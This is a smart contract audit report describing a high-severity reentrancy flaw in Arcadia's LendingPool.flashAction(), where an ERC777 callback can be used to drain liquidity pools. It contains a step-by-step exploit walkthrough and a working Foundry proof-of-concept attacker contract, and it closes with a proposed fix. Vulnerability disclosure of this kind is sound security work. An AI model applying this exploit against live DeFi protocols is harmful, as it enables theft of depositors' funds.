Radiant Parchment Troll

high

# Reentrancy in flashAction() allows draining liquidity pools

## Summary
It is possible to drain a liquidity pool/creditor if the pool’s asset is an ERC777 token by triggering a reentrancy flow using flash actions.

## Vulnerability Detail
The following vulnerability describes a complex flow that allows draining any liquidity pool where the underlying asset is an ERC777 token. Before diving into the vulnerability, it is important to properly understand and highlight some concepts from Arcadia that are relevant in order to allow this vulnerability to take place:

- **Flash actions**: flash actions in Arcadia operate in a similar fashion to flash loans. Any account owner will be able to borrow an arbitrary amount from the creditor without putting any collateral as long as the account remains in a healthy state at the end of execution. The following steps summarize what actually happens when `LendingPool.flashAction()` flow is triggered:
    1. The amount borrowed (plus fees) will be minted to the account as debt tokens. This means that the amount borrowed in the flash action **will be accounted as debt** during the whole `flashAction()` execution. If a flash action borrowing 30 tokens is triggered for an account that already has 10 tokens in debt, the debt balance of the account will increase to 40 tokens + fees.
    2. Borrowed asset will be transferred to the `actionTarget`. The `actionTarget` is an **arbitrary address** passed as parameter in the `flashAction()`. It is important to be aware of the fact that transferring the borrowed funds is performed **prior to calling flashActionByCreditor(),** which is the function that will end up verifying the account’s health state. This is the step where the reentrancy will be triggered by the `actionTarget`.
    3. The account’s `flashActionByCreditor()` function is called. This is the last step in the execution function, where a health check for the account is performed (among other things).
    
    ```solidity
    // LendingPool.sol
    
    function flashAction(
            uint256 amountBorrowed,
            address account,
            address actionTarget, 
            bytes calldata actionData,
            bytes3 referrer
        ) external whenBorrowNotPaused processInterests {
            ... 
    
            uint256 amountBorrowedWithFee = amountBorrowed + amountBorrowed.mulDivUp(originationFee, ONE_4);
    
            ...
     
            // Mint debt tokens to the Account, debt must be minted before the actions in the Account are performed.
            _deposit(amountBorrowedWithFee, account);
    
            ...
    
            // Send Borrowed funds to the actionTarget.
            asset.safeTransfer(actionTarget, amountBorrowed);
     
            // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)
            // to execute one or more actions (swap, deposit, mint...).
            // Next the action Target will deposit any of the remaining funds or any of the recipient token
            // resulting from the actions back into the Account.
            // As last step, after all assets are deposited back into the Account a final health check is done:
            // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).
            // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.
            {
                uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);
                if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();
            }
     
            ... 
        }
    ```
    
- **Collateral value:** Each creditor is configured with some risk parameters in the `Registry` contract. One of the risk parameters is the `minUsdValue`, which is the minimum USD value any asset must have when it is deposited into an account for the creditor to consider such collateral as valid. If the asset does not reach the `minUsdValue`, it will simply be accounted with a value of 0. For example: if the `minUsdValue` configured for a given creditor is 100 USD and we deposit an asset in our account worth 99 USD (let’s say 99 USDT), the USDT collateral will be accounted as 0. This means that our USDT will be worth nothing at the eyes of the creditor. However, if we deposit one more USDT token into the account, our USD collateral value will increase to 100 USD, reaching the `minUsdValue`. Now, the creditor will consider our account’s collateral to be worth 100 USD instead of 0 USD.
- **Liquidations:** Arcadia liquidates unhealthy accounts using a dutch-auction model. When a liquidation is triggered via `Liquidator.liquidateAccount()` all the information regarding the debt and assets from the account will be stored in `auctionInformation_` , which maps account addresses to an `AuctionInformation` struct. An important field in this struct is the `assetShares`, which will store the relative value of each asset, with respect to the total value of the Account.
    
    When a user wants to bid for an account in liquidation, the `Liquidator.bid()` function must be called. An important feature from this function is that it does not require the bidder to repay the loan in full (thus getting the full collateral in the account). Instead, the bidder can specify which collateral asset and amount wants to obtain back, and the contract will compute the amount of debt required to be repaid from the bidder for that amount of collateral. If the user wants to repay the full loan, all the collateral in the account will be specified by the bidder.
    

With this background, we can now move on to describing the vulnerability in full.

Initially, we will create an account and deposit collateral whose value is in the limit of the configured `minUsdValue` (if the `minUsdValue` is 100 tokens, the ideal amount to have will be 100 tokens to maximize gains). We will see why this is required later. The account’s collateral and debt status will look like this:

![arcadia_vuln_1](https://github.com/sherlock-audit/2023-12-arcadia-0xadrii/assets/56537955/4c4c3edc-b1e7-454d-be93-d0824f05338d)



The next step after creating the account is to trigger a flash action. As mentioned in the introduction, the borrowed funds will be sent to the `actionTarget` (this will be a contract we create and control). An important requirement is that if the borrowed asset is an ERC777 token, we will be able to execute the ERC777 callback in our `actionTarget` contract, enabling us to gain control of the execution flow. Following our example, if we borrowed 200 tokens the account’s status would look like this:

![arcadia_vuln_2](https://github.com/sherlock-audit/2023-12-arcadia-0xadrii/assets/56537955/732e4fd2-acea-4873-903c-91388c5855c3)


On receiving the borrowed tokens, the actual attack will begin. The`actionTarget` will trigger the `Liquidator.liquidateAccount()` function to liquidate our own account. This is possible because  the funds borrowed using the flash action  are accounted as debt for our account (as we can see in the previous image, the borrowed amount greatly surpasses our account’s collateral value) prior to executing the `actionTarget` ERC777 callback, making the account susceptible of being liquidated. Executing this function will start the auction process and store data relevant to the account and its debt in the `auctionInformation_` mapping. 

After finishing the `liquidateAccount()` execution, the next step for the `actionTarget` is  to place a bid for our own account auction calling `Liquidator.bid()`. The trick here is to request a small amount from the account’s collateral in the `askedAssetAmounts` array (if we had 100 tokens as collateral in the account, we could ask for only 1). The small requested amount will make the computed `price` to pay for the bid by `_calculateBidPrice()`  be really small so that we can maximize our gains. Another requirement will be to set the `endAuction_` parameter to `true` (we will see why later):

```solidity
// Liquidator.sol

function bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {
        AuctionInformation storage auctionInformation_ = auctionInformation[account];
        if (!auctionInformation_.inAuction) revert LiquidatorErrors.NotForSale();

        // Calculate the current auction price of the assets being bought.
        uint256 totalShare = _calculateTotalShare(auctionInformation_, askedAssetAmounts);
        uint256 price = _calculateBidPrice(auctionInformation_, totalShare);
				
				// Transfer an amount of "price" in "Numeraire" to the LendingPool to repay the Accounts debt.
        // The LendingPool will call a "transferFrom" from the bidder to the pool -> the bidder must approve the LendingPool.
        // If the amount transferred would exceed the debt, the surplus is paid out to the Account Owner and earlyTerminate is True.
        uint128 startDebt = auctionInformation_.startDebt;
        bool earlyTerminate = ILendingPool(auctionInformation_.creditor).auctionRepay(
            startDebt, auctionInformation_.minimumMargin, price, account, msg.sender
        );
		...
}
```

After computing the small price to pay for the bid, the`LendingPool.auctionRepay()` will be called. Because we are repaying a really small amount from the debt, the `accountDebt <= amount` condition will NOT hold, so the only actions performed by `LendingPool.auctionRepay()` will be transferring the small amount of tokens to pay the bid, and `_withdraw()` (burn) the corresponding debt from the account (a small amount of debt will be burnt here because the bid amount is small). It is also important to note that the `earlyTerminate` flag will remain as `false`:

```solidity
// LendingPool.sol

function auctionRepay(uint256 startDebt, uint256 minimumMargin_, uint256 amount, address account, address bidder)
        external
        whenLiquidationNotPaused
        onlyLiquidator 
        processInterests
        returns (bool earlyTerminate)
    {
        // Need to transfer before burning debt or ERC777s could reenter.
        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.
        asset.safeTransferFrom(bidder, address(this), amount);

        uint256 accountDebt = maxWithdraw(account); 
        if (accountDebt == 0) revert LendingPoolErrors.IsNotAnAccountWithDebt();
        if (accountDebt <= amount) {
            // The amount recovered by selling assets during the auction is bigger than the total debt of the Account.
            // -> Terminate the auction and make the surplus available to the Account-Owner.
            earlyTerminate = true;
            unchecked {
                _settleLiquidationHappyFlow(account, startDebt, minimumMargin_, bidder, (amount - accountDebt));
            }
            amount = accountDebt;
        }
  
        _withdraw(amount, address(this), account); 

        emit Repay(account, bidder, amount);
    }
```

After `LendingPool.auctionRepay()` , execution will go back to `Liquidator.bid()`. The account’s `auctionBid()` function will then be called, which will transfer the 1 token requested by the bidder in the `askedAssetAmounts` parameter from the account’s collateral to the bidder. This is the most important concept in the attack. Because 1 token is moving out from the account’s collateral, the current collateral value from the account will be decreased from 100 USD to 99 USD, making the collateral value be under the minimum `minUsdValue` amount of 100 USD, and thus making the collateral value from the account go straight to 0 at the eyes of the creditor:

![arcadia_vuln_3](https://github.com/sherlock-audit/2023-12-arcadia-0xadrii/assets/56537955/bfdc0b7d-dc1d-4b86-88cf-7d79cad9d761)


Because the `earlyTerminate` was NOT set to `true` in `LendingPool.auctionRepay()`, the `if (earlyTerminate)` condition will be skipped,  going straight to evaluate the `else if (endAuction_)` condition . Because we set the`endAuction_` parameter to true when calling the `bid()` function, `_settleAuction()` will execute.

```solidity
// Liquidator.sol

function bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {
        ...
				
				// Transfer the assets to the bidder.
        IAccount(account).auctionBid(
            auctionInformation_.assetAddresses, auctionInformation_.assetIds, askedAssetAmounts, msg.sender
        );
        // If all the debt is repaid, the auction must be ended, even if the bidder did not set endAuction to true.
        if (earlyTerminate) {
            // Stop the auction, no need to do a health check for the account since it has no debt anymore.
            _endAuction(account);
        }
        // If not all debt is repaid, the bidder can still earn a termination incentive by ending the auction
        // if one of the conditions to end the auction is met.
        // "_endAuction()" will silently fail without reverting, if the auction was not successfully ended.
        else if (endAuction_) {
            if (_settleAuction(account, auctionInformation_)) _endAuction(account);
        } 
    }
```

`_settleAuction()` is where the final steps of the attack will take place. Because we made the collateral value of our account purposely decrease from the `minUsdValue`, `_settleAuction` will interpret that all collateral has been sold, and the `else if (collateralValue == 0)` will evaluate to true, making the creditor’s `settleLiquidationUnhappyFlow()` function be called:

```solidity
function _settleAuction(address account, AuctionInformation storage auctionInformation_)
        internal
        returns (bool success)
    {
        // Cache variables.
        uint256 startDebt = auctionInformation_.startDebt;
        address creditor = auctionInformation_.creditor;
        uint96 minimumMargin = auctionInformation_.minimumMargin;

        uint256 collateralValue = IAccount(account).getCollateralValue();
        uint256 usedMargin = IAccount(account).getUsedMargin();
 
        // Check the different conditions to end the auction.
        if (collateralValue >= usedMargin || usedMargin == minimumMargin) { 
            // Happy flow: Account is back in a healthy state.
            // An Account is healthy if the collateral value is equal or greater than the used margin.
            // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.
            ILendingPool(creditor).settleLiquidationHappyFlow(account, startDebt, minimumMargin, msg.sender);
        } else if (collateralValue == 0) {
            // Unhappy flow: All collateral is sold.
            ILendingPool(creditor).settleLiquidationUnhappyFlow(account, startDebt, minimumMargin, msg.sender);
        }
				...
				 
				
        return true;
    }
```

Executing the `settleLiquidationUnhappyFlow()` will burn ALL the remaining debt (`balanceOf[account]` will return all the remaining balance of debt tokens for the account), and the liquidation will be finished, calling `_endLiquidation()` and leaving the account with 99 tokens of collateral and a 0 amount of debt (and the `actionTarget` with ALL the borrowed funds taken from the flash action).

```solidity
// LendingPool.sol

function settleLiquidationUnhappyFlow(
        address account,
        uint256 startDebt,
        uint256 minimumMargin_,
        address terminator
    ) external whenLiquidationNotPaused onlyLiquidator processInterests {
        ...

        // Any remaining debt that was not recovered during the auction must be written off.
        // Depending on the size of the remaining debt, different stakeholders will be impacted.
        uint256 debtShares = balanceOf[account];
        uint256 openDebt = convertToAssets(debtShares);
        uint256 badDebt;
        ...

        // Remove the remaining debt from the Account now that it is written off from the liquidation incentives/Liquidity Providers.
        _burn(account, debtShares);
        realisedDebt -= openDebt;
        emit Withdraw(msg.sender, account, account, openDebt, debtShares);

        _endLiquidation();

        emit AuctionFinished(
            account, address(this), startDebt, initiationReward, terminationReward, liquidationPenalty, badDebt, 0
        );
    }
```

After the `actionTarget`'s ERC777 callback execution, the execution flow will return to the initially called `flashAction()` function, and the final `IAccount(account).flashActionByCreditor()` function will be called, which will pass all the health checks due to the fact that all the debt from the account was burnt:

```solidity
// LendingPool.sol

function flashAction(
        uint256 amountBorrowed,
        address account,
        address actionTarget, 
        bytes calldata actionData,
        bytes3 referrer
    ) external whenBorrowNotPaused processInterests {
        
				... 
 
        // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)
        // to execute one or more actions (swap, deposit, mint...).
        // Next the action Target will deposit any of the remaining funds or any of the recipient token
        // resulting from the actions back into the Account.
        // As last step, after all assets are deposited back into the Account a final health check is done:
        // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).
        // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.
        {
            uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);
            if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();
        }
 
        ... 
    }
```

```solidity
// AccountV1.sol

function flashActionByCreditor(address actionTarget, bytes calldata actionData)
        external
        nonReentrant
        notDuringAuction
        updateActionTimestamp
        returns (uint256 accountVersion)
    {
        
				...

        // Account must be healthy after actions are executed.
        if (isAccountUnhealthy()) revert AccountErrors.AccountUnhealthy();

        ...
    }
```

## Proof of Concept

The following proof of concept illustrates how the previously described attack  can take place. Follow the steps in order to reproduce it:

1. Create a `ERC777Mock.sol` file in `lib/accounts-v2/test/utils/mocks/tokens` and paste the code found in [this github gist](https://gist.github.com/0xadrii/3677f0b5dfb9dcfe6b8b3953115d03f5).
2. Import the ERC777Mock and change the MockOracles, MockERC20 and Rates structs in `lib/accounts-v2/test/utils/Types.sol` to add an additional `token777ToUsd`, `token777` of type ERC777Mock and token777ToUsd rate:
    
    ```solidity
    import "../utils/mocks/tokens/ERC777Mock.sol"; // <----- Import this
    
    ...
    
    struct MockOracles {
        ArcadiaOracle stable1ToUsd;
        ArcadiaOracle stable2ToUsd;
        ArcadiaOracle token1ToUsd;
        ArcadiaOracle token2ToUsd;
        ArcadiaOracle token3ToToken4;
        ArcadiaOracle token4ToUsd;
        ArcadiaOracle token777ToUsd; // <----- Add this
        ArcadiaOracle nft1ToToken1;
        ArcadiaOracle nft2ToUsd;
        ArcadiaOracle nft3ToToken1;
        ArcadiaOracle sft1ToToken1;
        ArcadiaOracle sft2ToUsd;
    }
    
    struct MockERC20 {
        ERC20Mock stable1;
        ERC20Mock stable2;
        ERC20Mock token1;
        ERC20Mock token2;
        ERC20Mock token3;
        ERC20Mock token4;
        ERC777Mock token777; // <----- Add this
    }
    
    ...
    
    struct Rates {
        uint256 stable1ToUsd;
        uint256 stable2ToUsd;
        uint256 token1ToUsd;
        uint256 token2ToUsd;
        uint256 token3ToToken4;
        uint256 token4ToUsd;
        uint256 token777ToUsd; // <----- Add this
        uint256 nft1ToToken1;
        uint256 nft2ToUsd;
        uint256 nft3ToToken1;
        uint256 sft1ToToken1;
        uint256 sft2ToUsd;
    }
    ```
    
3. Replace the contents inside `lib/accounts-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/2eab11990f47385b584d6405cafa1d08).
4. To finish the setup, replace the file found in `lending-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/eeac07109792c24268a00ac8e4b3339d).
5. For the actual proof of concept, create a `Poc.t.sol` file in `test/fuzz/LendingPool` and paste the following code. The code contains the proof of concept test, as well as the action target implementation:
    
    ```solidity
    
    /**
     * Created by Pragma Labs
     * SPDX-License-Identifier: BUSL-1.1
     */
    pragma solidity 0.8.22;
    
    import { LendingPool_Fuzz_Test } from "./_LendingPool.fuzz.t.sol";
    
    import { ActionData, IActionBase } from "../../../lib/accounts-v2/src/interfaces/IActionBase.sol";
    import { IPermit2 } from "../../../lib/accounts-v2/src/interfaces/IPermit2.sol";
    
    /// @notice Proof of Concept - Arcadia
    contract Poc is LendingPool_Fuzz_Test {
    
        /////////////////////////////////////////////////////////////////
        //                        TEST CONTRACTS                       //
        /////////////////////////////////////////////////////////////////
    
        ActionHandler internal actionHandler;
        bytes internal callData;
    
        /////////////////////////////////////////////////////////////////
        //                          SETUP                              //
        /////////////////////////////////////////////////////////////////
    
        function setUp() public override {
            // Setup pool test
            LendingPool_Fuzz_Test.setUp();
    
            // Deploy action handler
            vm.prank(users.creatorAddress);
            actionHandler = new ActionHandler(address(liquidator), address(proxyAccount));
    
            // Set origination fee
            vm.prank(users.creatorAddress);
            pool.setOriginationFee(100); // 1%
    
            // Transfer some tokens to actiontarget to perform liquidation repayment and approve tokens to be transferred to pool 
            vm.startPrank(users.liquidityProvider);
            mockERC20.token777.transfer(address(actionHandler), 1 ether);
            mockERC20.token777.approve(address(pool), type(uint256).max);
    
            // Deposit 100 erc777 tokens into pool
            vm.startPrank(address(srTranche));
            pool.depositInLendingPool(100 ether, users.liquidityProvider);
            assertEq(mockERC20.token777.balanceOf(address(pool)), 100 ether);
    
            // Approve creditor from actiontarget for bid payment
            vm.startPrank(address(actionHandler));
            mockERC20.token777.approve(address(pool), type(uint256).max);
    
        }
    
        /////////////////////////////////////////////////////////////////
        //                           POC                               //
        /////////////////////////////////////////////////////////////////
        /// @notice Test exploiting the reentrancy vulnerability. 
        /// Prerequisites:
        /// - Create an actionTarget contract that will trigger the attack flow using the ERC777 callback when receiving the 
        ///   borrowed funds in the flash action.
        /// - Have some liquidity deposited in the pool in order to be able to borrow it
        /// Attack:
        /// 1. Open a margin account in the creditor to be exploited.
        /// 2. Deposit a small amount of collateral. This amount needs to be big enough to cover the `minUsdValue` configured
        /// in the registry for the given creditor.
        /// 3. Create the `actionData` for the account's `flashAction()` function. The data contained in it (withdrawData, transferFromOwnerData,
        /// permit, signature and actionTargetData) can be empty, given that such data is not required for the attack.
        /// 4. Trigger LendingPool.flashAction(). The execution flow will:
        ///     a. Mint the flash-actioned debt to the account
        ///     b. Send the borrowed funds to the action target
        ///     c. The action target will execute the ERC777 `tokensReceived()` callback, which will:
        ///        - Trigger Liquidator.liquidateAccount(), which will set the account in an auction state
        ///        - Trigger Liquidator.bid(). 
     
        function testVuln_reentrancyInFlashActionEnablesStealingAllProtocolFunds(
            uint128 amountLoaned,
            uint112 collateralValue,
            uint128 liquidity,
            uint8 originationFee
        ) public {   
    
            //----------            STEP 1            ----------//
            // Open a margin account
            vm.startPrank(users.accountOwner);
            proxyAccount.openMarginAccount(address(pool)); 
            
            //----------            STEP 2            ----------//
            // Deposit 1 stable token in the account as collateral.
            // Note: The creditors's `minUsdValue` is set to 1 * 10 ** 18. Because
            // value is converted to an 18-decimal number and the asset is pegged to 1 dollar,
            // depositing an amount of 1 * 10 ** 6 is the actual minimum usd amount so that the 
            // account's collateral value is not considered as 0.
            depositTokenInAccount(proxyAccount, mockERC20.stable1, 1 * 10 ** 6);
            assertEq(proxyAccount.getCollateralValue(), 1 * 10 ** 18);
    
            //----------            STEP 3            ----------//
            // Create empty action data. The action handler won't withdraw/deposit any asset from the account 
            // when the `flashAction()` callback in the account is triggered. Hence, action data will contain empty elements.
            callData = _buildActionData();
    
            // Fetch balances from the action handler (who will receive all the borrowed funds from the flash action)
            // as well as the pool. 
            // Action handler balance initially has 1 token of token777 (given initially on deployment)
            assertEq(mockERC20.token777.balanceOf(address(actionHandler)), 1 * 10 ** 18);
            uint256 liquidityPoolBalanceBefore =  mockERC20.token777.balanceOf(address(pool));
            uint256 actionHandlerBalanceBefore =  mockERC20.token777.balanceOf(address(actionHandler));
            // Pool initially has 100 tokens of token777 (deposited by the liquidity provider in setUp())
            assertEq(mockERC20.token777.balanceOf(address(pool)), 100 * 10 ** 18);
    
            //----------            STEP 4            ----------//
            // Step 4. Trigger the flash action.
            vm.startPrank(users.accountOwner);
    
            pool.flashAction(100 ether , address(proxyAccount), address(actionHandler), callData, emptyBytes3);
            vm.stopPrank();
     
            
            //----------       FINAL ASSERTIONS       ----------//
    
            // Action handler (who is the receiver of the borrowed funds in the flash action) has succesfully obtained 100 tokens from 
            //the pool, and in the end it has nearly 101 tokens (initially it had 1 token, plus the 100 tokens stolen 
            // from the pool minus the small amount required to pay for the bid)
            assertGt(mockERC20.token777.balanceOf(address(actionHandler)), 100 * 10 ** 18);
    
            // On the other hand, pool has lost nearly all of its balance, only remaining the small amount paid from the 
            // action handler in order to bid
            assertLt(mockERC20.token777.balanceOf(address(pool)), 0.05 * 10 ** 18);
        
        } 
    
        /// @notice Internal function to build the `actionData` payload needed to execute the `flashActionByCreditor()` 
        /// callback when requesting a flash action
        function _buildActionData() internal returns(bytes memory) {
            ActionData memory emptyActionData;
            address[] memory to;
            bytes[] memory data;
            bytes memory actionTargetData = abi.encode(emptyActionData, to, data);
            IPermit2.PermitBatchTransferFrom memory permit;
            bytes memory signature;
            return abi.encode(emptyActionData, emptyActionData, permit, signature, actionTargetData);
        }
    }
    
    /// @notice ERC777Recipient interface
    interface IERC777Recipient {
       
        function tokensReceived(
            address operator,
            address from,
            address to,
            uint256 amount,
            bytes calldata userData,
            bytes calldata operatorData
        ) external;
    }
    
     /// @notice Liquidator interface
    interface ILiquidator {
        function liquidateAccount(address account) external;
        function bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external;
    }
    
     /// @notice actionHandler contract that will trigger the attack via ERC777's `tokensReceived()` callback
    contract ActionHandler is IERC777Recipient, IActionBase {
    
        ILiquidator public immutable liquidator;
        address public immutable account;
        uint256 triggered;
    
        constructor(address _liquidator, address _account) {
            liquidator = ILiquidator(_liquidator);
            account = _account;
        }  
    
    		 /// @notice ERC777 callback function
        function tokensReceived(
            address operator,
            address from,
            address to,
            uint256 amount,
            bytes calldata userData,
            bytes calldata operatorData
        ) external {
            // Only trigger the callback once (avoid triggering it while receiving funds in the setup + when receiving final funds)
            if(triggered == 1) {
                triggered = 2;
                liquidator.liquidateAccount(account);
                uint256[] memory askedAssetAmounts = new uint256[](1);
                askedAssetAmounts[0] = 1; // only ask for 1 wei of token so that we repay a small share of the debt
                liquidator.bid(account, askedAssetAmounts, true);
            }
    				unchecked{
    	        triggered++;
    				}
        }
    
        function executeAction(bytes calldata actionTargetData) external returns (ActionData memory) {
            ActionData memory data;
            return data;
        }
    
    }
    ```
    
6. Execute the proof of concept with the following command (being inside the `lending-v2` folder): `forge test --mt testVuln_reentrancyInFlashActionEnablesStealingAllProtocolFunds`

## Impact

The impact for this vulnerability is high.  All funds deposited in creditors with ERC777 tokens as the underlying asset can be drained.

## Code Snippet
https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L567

## Tool used

Manual Review, foundry

## Recommendation

This attack is possible because the `getCollateralValue()` function returns a 0 collateral value due to the `minUsdValue` mentioned before not being reached after executing the bid. The Liquidator’s `_settleAuction()` function then believes the collateral held in the account is 0.

In order to mitigate the issue, consider fetching the actual real collateral value inside `_settleAuction()` even if it is less than the `minUsdValue` held in the account, so that the function can properly check if the full collateral was sold or not.

```solidity
// Liquidator.sol
function _settleAuction(address account, AuctionInformation storage auctionInformation_)
        internal
        returns (bool success)
    {
        ...

        uint256 collateralValue = IAccount(account).getCollateralValue(); // <----- Fetch the REAL collateral value instead of reducing it to 0 if `minUsdValue` is not reached
        
 
        ...
    }
```